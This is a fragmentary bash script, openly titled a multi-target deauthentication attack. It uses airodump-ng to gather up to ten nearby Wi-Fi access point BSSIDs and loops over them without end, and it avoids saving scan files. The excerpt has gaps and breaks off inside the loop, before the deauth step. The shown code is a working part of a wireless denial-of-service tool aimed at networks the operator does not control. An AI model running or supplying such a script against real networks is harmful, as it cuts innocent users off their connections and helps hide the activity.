...
# Multi Deauth Attack Script - Fast Scan (No file saves)
...
# Use airodump-ng but redirect output to avoid saving any files
bssids=($(sudo timeout 10s airodump-ng --output-format csv $mon_interface | grep -a -m 10 ":..:..:..:..:..:.." | awk -F',' '{print $1}' | head -n 10 | sed 's/ //g'))
...
while true; do
    for bssid in "${bssids[@]}"; do
        # Get the channel without saving scan results
